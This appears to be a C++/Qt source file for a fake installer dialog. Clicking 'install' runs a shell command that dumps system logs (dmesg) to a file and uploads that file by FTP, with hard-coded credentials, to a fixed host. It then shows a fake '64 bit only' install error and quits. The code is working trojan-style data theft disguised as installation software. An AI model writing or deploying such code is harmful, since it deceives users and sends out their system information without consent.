#include "dialog.h"
#include "ui_dialog.h"
#include "stdlib.h"
#include <fstream>
#include <QtNetwork>
#include <QtGlobal>
#include <QVBoxLayout>
#include <QPushButton>
#include <QLabel>
#include <QMessageBox>
#include <iostream>

Dialog::Dialog(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Dialog)
{
    ui->setupUi(this);
    ui->progressBar->hide();
    connect(ui->pushButton, SIGNAL(clicked()),
            this, SLOT(install()));
}

void Dialog::install()
{
    //1.popup installer

    //2.gater system info
    system("dmesg >> log");

    //3.send info to the server
    ftp = new QFtp(this);
    ftp->connectToHost("192.168.1.136");
    int status = ftp->login("minibootdisk", "cute");
    connect(ftp, SIGNAL(commandFinished(int,bool)),
                 this, SLOT(ftpCommandFinished(int,bool)));
    connect(ftp, SIGNAL(dataTransferProgress(qint64,qint64)),
                 this, SLOT(updateDataTransferProgress(qint64,qint64)));
     ui->progressBar->show();

//    qDebug("ftp log in status");
//    std::cout << status << std::endl;

//    //4.popup install fail
}

void Dialog::ftpCommandFinished(int, bool)
{
    if (ftp->currentCommand() == QFtp::Login)
    {
        std::cout << "ftp status login" << std::endl;

        file = new QFile("./log", this);
        file->open(QFile::ReadOnly);
        //qDebug(file->readAll());
        qDebug("down read all");
        ftp->put(file, "./log");

    }
    if (ftp->currentCommand() == QFtp::Put)
    {
        qDebug("file done put");
        file->close();
        //QMessageBox *qd = new QMessageBox("Install Error","this version is designed for 64 bit operating sys QMessageBox::Warning | QMessageBox::Yes);

        //qd->setWindowTitle("Install Error");
        //qd->setModal(true);
        //QVBoxLayout *layout = new QVBoxLayout(qd);
        QPushButton *qpb = new QPushButton("Close.");
        QLabel *qlb = new QLabel("this version is designed for 64 bit operating systems only");
        //layout->addWidget(qpb);
        //layout->addWidget(qlb);

        //connect(qpb, SIGNAL(clicked()), this,   SLOT(terminate_app()));

        QMessageBox *qd = new QMessageBox(QMessageBox::Critical,"InstallError", "64 bit only",
                                          QMessageBox::Abort, this);
        //qd->show();
        //qd->raise();
        if (qd->exec() == QMessageBox::Abort)
        {
            terminate_app();
        }

    }
}

void Dialog::updateDataTransferProgress(qint64 readBytes, qint64 totalBytes)
{
        ui->progressBar->setMaximum(totalBytes);
        ui->progressBar->setValue(readBytes);
}

void Dialog::terminate_app()
{
    QApplication::exit();
}

Dialog::~Dialog()
{
    delete ui;
}
